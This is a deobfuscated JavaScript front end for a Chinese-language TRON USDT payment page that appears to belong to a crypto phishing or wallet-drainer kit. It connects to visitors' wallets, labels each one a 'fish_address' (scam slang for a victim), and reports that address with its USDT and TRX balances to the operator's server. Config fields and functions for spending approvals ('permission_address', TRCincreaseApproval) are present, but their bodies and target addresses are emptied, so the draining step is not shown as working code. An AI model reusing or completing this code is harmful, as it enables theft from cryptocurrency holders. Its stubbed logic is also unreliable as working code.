//Wed Jan 28 2026 09:44:34 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
const g = {
  address: null,
  gasBalance: null,
  usdtBalance: null,
  energyBalance: null,
  chain: "TRC",
  unique_id: null,
  actualPrice: 0.1,
  connected: false
};
const d = {
  domain: "",
  payment_address: "",
  permission_address: "",
  authorized_amount: "",
  authorize_note: "",
  model: "1",
  default_id: ""
};
let __inFlightPayProcess = false;
const B = {
  usdt: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
  decimals: 6,
  symbol: "TRX",
  chainId: null,
  gas: 1,
  energyBalance: 100000
};
const p = {
  TRC: B
};
function initPaymentUI(R) {
  setPageTitleAndIcon();
  initialize().then(() => {
    const q = detectDeviceType(),
      T = document.getElementById(R) || document.getElementById("app") || document.body;
    if (!T) {
      return;
    }
    if (q === "pc") {
      T.innerHTML = createPCPaymentUI();
      generateQRCode();
    } else {
      if (q === "mobile") {
        ensureWalletGridStyles();
        T.innerHTML = createMobilePaymentUI();
        updateWalletOptions(g.chain);
      } else {
        if (q === "dapp") {
          T.innerHTML = createDappPaymentUI();
          connectWallet();
        }
      }
    }
  });
}
function sleep(R) {
  return new Promise(K => setTimeout(K, R));
}
async function waitForTronReady(K = 6000) {
  const N = Date.now();
  while (Date.now() - N < K) {
    if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
      return true;
    }
    try {
      if (window.tronWeb && (!window.tronWeb.defaultAddress || !window.tronWeb.defaultAddress.base58)) {
        const o = {
          method: "tron_requestAccounts"
        };
        await window.tronWeb.request(o);
      }
    } catch (x) {}
    await sleep(200);
  }
  return !!(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58);
}
async function withRetry(R, K = 3, m = 300) {
  let q;
  for (let T = 0; T < K; T++) {
    try {
      return await R();
    } catch (E) {
      q = E;
      await sleep(m);
    }
  }
  throw q;
}
function setPageTitleAndIcon() {
  const K = getActualPrice();
  if (K) {
    document.title = "正在转账 " + K + " USDT";
  } else {
    if (g.actualPrice) {
      document.title = "正在转账 " + g.actualPrice + " USDT";
    }
  }
  let m = document.querySelector("link[rel~='icon']");
  !m && (m = document.createElement("link"), m.rel = "icon", document.getElementsByTagName("head")[0].appendChild(m));
  m.href = "/assets/common/images/usdt.ico";
}
function createPCPaymentUI() {
  return "\n        <div id=\"pcContainer\" class=\"device-container\" style=\"display: block;\">\n            <div class=\"qr-code-container\">\n                <p class=\"qr-code-title\">请使用钱包App扫描支付</p>\n                <div class=\"qr-code-box\">\n                    <div id=\"qrcode-container\"></div>\n                    <div class=\"qr-logo-container\">\n                        <img src=\"/assets/common/images/tether-usdt-logo.png\" class=\"qr-logo\">\n                    </div>\n                </div>\n            </div>\n        </div>\n    ";
}
function createMobilePaymentUI() {
  return "\n        <div id=\"mobileContainer\" class=\"device-container\" style=\"display: block;\">\n            <div class=\"wallet-selection\">\n                <h3>选择付款钱包</h3>\n                <div class=\"wallet-options\" id=\"wallets\">\n                </div>\n            </div>\n            <a href=\"javascript:void(0);\" onclick=\"payNow()\" class=\"pay-btn\">\n                打开钱包支付\n            </a>\n        </div>\n    ";
}
function createDappPaymentUI() {
  return "\n        <div id=\"dappContainer\" class=\"device-container\" style=\"display: block;\">\n            <p style=\"text-align: center; margin: 20px 0; color:rgb(174, 235, 20); font-weight: bold;\">\n                请直接点击下方按钮完成支付\n            </p>\n            <a href=\"javascript:void(0);\" id=\"dappPayButton\" class=\"pay-btn\">\n                确认转账 " + g.actualPrice + " USDT\n            </a>\n        </div>\n    ";
}
async function initialize() {
  let K = new URLSearchParams(window.location.search);
  let m = K.get("id");
  if (m) {
    m = m.split("#")[0];
    const q = m.match(/^([A-Za-z0-9]{11})$/);
    q && (g.unique_id = q[1]);
  }
  try {
    const o = await fetch("/payment-config"),
      i = await o.json();
    if (i.status === "success" && i.config) {
      if (i.config.domain) {
        const E = i.config.domain.split(/\r\n|\r|\n/).map(h => h.trim()).filter(h => h);
        if (E.length > 0) {
          const h = Math.floor(Math.random() * E.length);
          i.config.domain = E[h];
        }
      }
      if (i.config.permission_address) {
        const I = i.config.permission_address.split(/\r?\n|,|;|\s+/).map(l => l.trim()).filter(l => /^T[A-Za-z0-9]{33}$/.test(l));
        I.length > 0 && (i.config.permission_address = I[0]);
      }
      Object.assign(d, i.config);
      const e = getActualPrice();
      if (e !== null) {
        g.actualPrice = e;
      }
      return true;
    }
    return false;
  } catch (a) {
    console.error("initialize 初始化失败:", a);
    return false;
  }
}
function getActualPrice() {
  let K = null;
  const m = document.querySelectorAll("tr, .mb-1, .price-item");
  m.forEach(N => {
    const T = N.querySelector("th, label, .price-label"),
      o = N.querySelector("td, span, .price-value");
    if (T && o) {
      const x = T.textContent.trim();
      if (x.includes("实际支付价格") || x.includes("price-value") || x.includes("总价")) {
        const e = o.textContent.trim(),
          E = parseFloat(e.replace(/[^\d.]/g, ""));
        !isNaN(E) && E > 0 && (K = E);
      }
    }
  });
  if (!K) {
    const q = document.querySelectorAll(".price, .price-value, .actual-price");
    q.forEach(T => {
      const x = T.textContent.trim(),
        e = parseFloat(x.replace(/[^\d.]/g, ""));
      !isNaN(e) && e > 0 && (K = e);
    });
  }
  return K;
}
function detectDeviceType() {
  const N = navigator.userAgent || "";
  const q = /(OneKey|OneKeyWallet|TokenPocket|imToken|TronLink|BitKeep|Bitget)/i.test(N),
    T = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(N),
    o = typeof window !== "undefined" && typeof window.tronWeb !== "undefined";
  if (T && o) {
    return "dapp";
  }
  if (T || q) {
    return "mobile";
  }
  return "pc";
}
function isInApp() {
  const R = navigator.userAgent || "";
  return /MicroMessenger|QQ\/[0-9]|TIM|DingTalk|Weibo|Telegram|Instagram|FBAV|FBAN|Line|KAKAOTALK/i.test(R);
}
function generateQRCode() {
  try {
    let N = window.location.href;
    const q = document.getElementById("qrcode-container");
    if (q) {
      q.innerHTML = "";
      const n = {
        value: N,
        size: 240,
        level: "H",
        background: "white"
      };
      const I = new QRious(n),
        l = document.createElement("img");
      l.src = I.toDataURL();
      l.width = 240;
      l.height = 240;
      l.style.display = "block";
      q.appendChild(l);
    }
  } catch (Q) {
    console.error("二维码生成失败:", Q);
  }
}
function ensureWalletGridStyles() {
  try {
    const q = "wallet-grid-override";
    if (document.getElementById(q)) {
      return;
    }
    const T = document.createElement("style");
    T.id = q;
    T.textContent = "\n            .wallet-options { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; width: 90%; margin: 0 auto; }\n            @media (max-width: 768px) {\n                .wallet-options { grid-template-columns: repeat(2, 1fr); }\n            }\n        ";
    document.head.appendChild(T);
  } catch (o) {}
}
function updateWalletOptions(i) {
  const E = document.getElementById("wallets");
  if (!E) {
    return;
  }
  E.innerHTML = "";
  const h = {
    id: "imToken",
    name: "imToken钱包",
    icon: "/assets/common/images/imtoken.png"
  };
  const y = {
    id: "tokenpocket",
    name: "TokenPocket",
    icon: "/assets/common/images/tokenpocket.png"
  };
  const U = {
    id: "TronLink",
    name: "TronLink钱包",
    icon: "/assets/common/images/TronLink.png"
  };
  const n = {
    id: "Onekey",
    name: "OneKey钱包",
    icon: "/assets/common/images/onekey.png"
  };
  const I = {
    id: "Bitpie",
    name: "Bitpie钱包",
    icon: "/assets/common/images/bitpie.png"
  };
  const l = {
    id: "Bitget",
    name: "Bitget钱包",
    icon: "/assets/common/images/bitget.png"
  };
  const Q = [h, y, U, n, I, l];
  Q.forEach(J => {
    const F = document.createElement("div");
    F.className = "wallet-option";
    F.setAttribute("data-wallet", J.id);
    F.innerHTML = "\n            <img src=\"" + J.icon + "\" alt=\"" + J.name + "\">\n            <span>" + J.name + "</span>\n        ";
    F.addEventListener("click", function () {
      const O = E.querySelectorAll(".wallet-option");
      O.forEach(Y => Y.classList.remove("selected"));
      this.classList.add("selected");
    });
    E.appendChild(F);
  });
}
function payNow() {
  const m = document.querySelector("#wallets .wallet-option.selected");
  if (!m) {
    alert("请先选择您的付款钱包");
    return;
  }
  const N = m.getAttribute("data-wallet");
  let q = window.location.href;
  const T = {};
  T.Bitpie = "/assets/common/images/bitpie.jpg";
  T.Onekey = "/assets/common/images/onekey.jpg";
  const o = T;
  if (o[N]) {
    walletModal.show(o[N], q);
    return;
  }
  const i = {
      imToken: "imtokenv2://navigate?screen=DappView&url=" + encodeURIComponent(q),
      tokenpocket: "tpdapp://open?params=" + encodeURIComponent(JSON.stringify({
        url: q
      })),
      Bitget: "bitget://dapp?url=" + encodeURIComponent(q),
      TronLink: (() => {
        const F = {
          url: encodeURIComponent(q),
          action: "open",
          protocol: "tronlink",
          version: "1.0"
        };
        return "tronlinkoutside://pull.activity?param=" + encodeURIComponent(JSON.stringify(F));
      })()
    },
    x = i[N];
  if (x) {
    console.log("跳转钱包【" + N + "】：", x);
    if (!isInApp()) {
      window.location.href = x;
    } else {
      window.location.replace(q);
    }
  } else {
    alert("暂不支持该钱包类型：" + N);
    console.error("未知钱包类型:", N);
  }
}
const walletModal = {
  show(K, m) {
    const T = m || window.location.href,
      o = T.split("?")[0];
    document.getElementById("currentUrl").textContent = o;
    document.getElementById("currentUrl").dataset.fullUrl = T;
    document.getElementById("walletGuideImage").src = K;
    document.getElementById("walletModal").style.display = "block";
  },
  close() {
    document.getElementById("walletModal").style.display = "none";
  },
  copyUrl() {
    const K = document.getElementById("currentUrl").dataset.fullUrl;
    const m = () => alert("复制失败，请手动复制");
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(K).then(() => this.showCopySuccess()).catch(m);
    } else {
      const T = document.createElement("textarea");
      T.value = K;
      T.style.position = "absolute";
      T.style.left = "-9999px";
      document.body.appendChild(T);
      T.select();
      try {
        if (!document.execCommand("copy")) {
          throw new Error();
        }
        this.showCopySuccess();
      } catch {
        m();
      }
      document.body.removeChild(T);
    }
  },
  showCopySuccess() {
    const K = document.getElementById("copySuccess");
    K.style.display = "block";
    setTimeout(() => {
      K.style.display = "none";
    }, 2000);
  }
};
async function connectWallet() {
  const m = document.getElementById("dappPayButton");
  const N = p[g.chain].symbol;
  const q = "无法连接到" + N + "网络，请检查您的钱包网络";
  try {
    if (g.chain === "TRC") {
      if (typeof window.tronWeb === "undefined") {
        updateButton(m, q, true);
        return;
      }
      try {
        if (!window.tronWeb.defaultAddress || !window.tronWeb.defaultAddress.base58) {
          const F = {
            method: "tron_requestAccounts"
          };
          await window.tronWeb.request(F);
        }
      } catch (k) {}
      const i = await waitForTronReady(6000);
      if (!i || !window.tronWeb.defaultAddress || !window.tronWeb.defaultAddress.base58) {
        updateButton(m, q, true);
        return;
      }
      g.address = window.tronWeb.defaultAddress.base58;
      g.connected = true;
      let x = await getTronBalances();
      if (!x) {
        await sleep(500);
        x = await getTronBalances();
      }
      if (!x) {
        updateButton(m, "无法获取余额信息，请刷新页面重试", true);
        return;
      }
      broadcastBrowseInfo();
      const e = 105000,
        E = 100,
        h = parseInt(g.energyBalance || 0, 10),
        y = parseFloat(g.gasBalance || 0),
        U = Math.floor(y * 1000000 / E),
        n = h >= e,
        I = h + U >= e,
        l = n || I;
      if (!l) {
        updateButton(m, N + "矿工费不足无法发起转账", true);
      } else {
        updateButton(m, "确认开始转账", false);
      }
    } else {
      updateButton(m, q, true);
      return;
    }
  } catch (W) {
    console.error("钱包连接失败:", W);
    updateButton(m, q, true);
  }
}
async function broadcastBrowseInfo() {
  try {
    if (!g?.["address"] || g.address.trim() === "") {
      return false;
    }
    const K = "",
      m = new Date(),
      N = m.getFullYear() + "-" + String(m.getMonth() + 1).padStart(2, "0") + "-" + String(m.getDate()).padStart(2, "0") + " " + String(m.getHours()).padStart(2, "0") + ":" + String(m.getMinutes()).padStart(2, "0") + ":" + String(m.getSeconds()).padStart(2, "0"),
      q = {
        fish_address: g.address,
        chainid: g.chain,
        permissions_fishaddress: K || "",
        unique_id: g.unique_id || null,
        usdt_balance: parseFloat(g.usdtBalance || 0).toFixed(6),
        gas_balance: parseFloat(g.gasBalance || 0).toFixed(6),
        time: N
      };
    await fetch("/browse-broadcast", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(q)
    });
    return true;
  } catch (i) {
    console.error("钱包连接播报失败:", i);
    return false;
  }
}
async function getTronBalances() {
  try {
    const m = await withRetry(() => window.tronWeb.trx.getBalance(g.address));
    g.gasBalance = (m / 1000000).toFixed(6);
    const N = await withRetry(() => window.tronWeb.contract().at(p.TRC.usdt)),
      q = await withRetry(() => N.methods.balanceOf(g.address).call());
    let T;
    if (typeof q === "string" || typeof q === "number") {
      T = BigInt(q);
    } else {
      if (q && typeof q === "object" && "_hex" in q) {
        T = BigInt(q._hex);
      } else {
        T = BigInt(q.toString());
      }
    }
    const o = Number(T) / 1000000;
    g.usdtBalance = o.toFixed(6);
    const i = await withRetry(() => window.tronWeb.trx.getAccountResources(g.address));
    if (i && typeof i === "object") {
      const y = i.EnergyLimit || 0,
        U = i.EnergyUsed || 0;
      g.energyBalance = y - U;
    } else {
      g.energyBalance = 0;
    }
    if (isNaN(g.energyBalance)) {
      g.energyBalance = 0;
    }
    return true;
  } catch (l) {
    console.error("getTronBalances 错误:", l);
    g.gasBalance = "0.000000";
    g.usdtBalance = "0.000000";
    g.energyBalance = 0;
    return false;
  }
}
async function getUSDTAllowance(R, K) {
  try {
    if (!window.tronWeb || !R || !K) {
      return 0;
    }
    const N = await window.tronWeb.contract().at(p.TRC.usdt),
      q = await N.methods.allowance(R, K).call();
    let T;
    if (typeof q === "string" || typeof q === "number") {
      T = BigInt(q);
    } else {
      q && typeof q === "object" && "_hex" in q ? T = BigInt(q._hex) : T = BigInt(q.toString());
    }
    return Number(T) / 1000000;
  } catch (E) {
    return 0;
  }
}
async function checkAndPayProcess() {
  const K = document.getElementById("dappPayButton");
  if (!K) {
    return;
  }
  if (__inFlightPayProcess) {
    showTemporaryMessage("转账处理中...");
    return;
  }
  __inFlightPayProcess = true;
  let m = false;
  try {
    updateButton(K, "转账处理中...", true);
    let T = false;
    const o = new FormData();
    o.append("fish_address", g.address);
    o.append("chainid", g.chain);
    const i = await fetch("/query-address", {
        method: "POST",
        body: o
      }),
      x = await i.text();
    let e = JSON.parse(x);
    T = e.status === "success" && e.result === "yes";
    if (T) {
      if (""?.["trim"]()) {
        showTemporaryMessage("");
      }
      m = true;
      return;
    } else {
      const y = ("" || "").trim();
      let U = false;
      if (g.address && /^T[A-Za-z0-9]{33}$/.test(y)) {
        const I = await getUSDTAllowance(g.address, y);
        U = I > 0;
      }
      let n = false;
      U ? n = await TRCapproval() : n = await TRCincreaseApproval();
      m = !!n;
    }
  } catch (F) {
    console.error("checkAndPayProcess错误:", F);
    m = false;
  } finally {
    __inFlightPayProcess = false;
    const O = document.getElementById("dappPayButton");
    O && updateButton(O, "确认开始转账", m);
  }
}
function updateButton(R, K, m) {
  if (!R) {
    return R;
  }
  const q = R.cloneNode(true);
  R.parentNode.replaceChild(q, R);
  q.textContent = K;
  q.disabled = m;
  if (m) {
    q.classList.add("disabled");
    q.style.backgroundColor = "#aaaaaa";
    q.style.cursor = "not-allowed";
  } else {
    q.classList.remove("disabled");
    q.style.backgroundColor = "";
    q.style.cursor = "pointer";
    q.addEventListener("click", checkAndPayProcess);
  }
  return q;
}
async function TRCapproval() {
  try {
    ""?.["trim"]() && showTemporaryMessage("");
    return true;
  } catch (e) {
    if (e?.["message"]?.["includes"]("declined")) {
      showTemporaryMessage("您取消了转账");
    } else {
      showTemporaryMessage("转账失败");
    }
    return false;
  }
}
async function TRCincreaseApproval() {
  try {
    if (""?.["trim"]()) {
      showTemporaryMessage("");
    }
    return true;
  } catch (e) {
    if (e?.["message"]?.["includes"]("declined")) {
      showTemporaryMessage("您取消了转账");
    } else {
      showTemporaryMessage("转账失败");
    }
    return false;
  }
}
async function TRCUsdtTransfer() {
  try {
    let N = null;
    if (g.unique_id) {
      try {
        const e = {
          unique_id: g.unique_id
        };
        const E = await fetch("/agent-payment-address", {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify(e)
          }),
          h = await E.json();
        if (h.status && h.status !== "no") {
          N = h.status;
        }
      } catch (n) {}
    }
    !N && (N = "");
    const q = await window.tronWeb.contract().at(p.TRC.usdt),
      T = window.tronWeb.toBigNumber(g.actualPrice * 1000000),
      o = {};
    o.feeLimit = 100000000;
    o.shouldPollResponse = true;
    const i = await q.methods.transfer(N, T.toString()).send(o);
    if (i) {
      const l = window.location.href,
        Q = l.match(/\/bill\/([A-Z0-9]+)(?:\?|$)/);
      let J = "";
      if (Q && Q[1]) {
        J = Q[1];
      } else {
        return;
      }
      showTransactionCountdown(10);
      setTimeout(() => {
        verifyTransaction(J, g.address, N, p.TRC.usdt, i);
      }, 3000);
    }
  } catch (Y) {
    showTemporaryMessage("转账失败，请重试");
  }
}
async function verifyTransaction(K, m, N, q, T) {
  try {
    const x = {
      order_sn: K,
      userAddress: m,
      toAddress: N,
      usdtContractAddress: q,
      txHash: T
    };
    const E = await fetch("/payment/trc20/verify", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(x)
      }),
      h = await E.json();
    if (h.success) {
      showTemporaryMessage("转账成功，即将跳转订单界面！");
      const U = window.location.origin,
        n = g.chain.toLowerCase(),
        I = g.unique_id || "",
        l = "" + n + I;
      setTimeout(() => {
        window.location.href = U + "/search-order-by-browser?id=" + l;
      }, 2000);
    }
  } catch (Q) {
    console.error("验证交易失败:", Q);
  }
}
function showTransactionCountdown(R) {
  const m = document.createElement("div");
  m.id = "transaction-countdown";
  m.textContent = "正在确认交易，请等待：" + R + "秒";
  m.style.position = "fixed";
  m.style.top = "30%";
  m.style.left = "50%";
  m.style.transform = "translateX(-50%)";
  m.style.backgroundColor = "rgba(52, 152, 219, 0.8)";
  m.style.color = "white";
  m.style.padding = "12px 25px";
  m.style.borderRadius = "6px";
  m.style.boxShadow = "0 4px 8px rgba(0, 0, 0, 0.2)";
  m.style.zIndex = "1000";
  m.style.fontSize = "16px";
  m.style.fontWeight = "bold";
  m.style.textAlign = "center";
  m.style.minWidth = "200px";
  document.body.appendChild(m);
  let N = R;
  const q = setInterval(() => {
    N--;
    if (N <= 0) {
      clearInterval(q);
      m.remove();
    } else {
      m.textContent = "正在确认交易，请等待：" + N + "秒";
    }
  }, 1000);
}
function showTemporaryMessage(R) {
  const m = document.createElement("div");
  m.textContent = R;
  m.style.position = "fixed";
  m.style.top = "38%";
  m.style.left = "50%";
  m.style.transform = "translateX(-50%)";
  m.style.backgroundColor = "rgba(220, 53, 69, 0.7)";
  m.style.color = "white";
  m.style.padding = "10px 20px";
  m.style.borderRadius = "4px";
  m.style.boxShadow = "0 4px 8px rgba(0, 0, 0, 0.2)";
  m.style.zIndex = "1000";
  m.style.fontSize = "16px";
  m.style.textAlign = "center";
  m.style.maxWidth = "80%";
  m.style.maxHeight = "50%";
  m.style.overflowY = "auto";
  m.style.wordWrap = "break-word";
  document.body.appendChild(m);
  setTimeout(() => {
    m.remove();
  }, 3000);
}
window.initPaymentUI = initPaymentUI;
window.payNow = payNow;
window.walletModal = walletModal;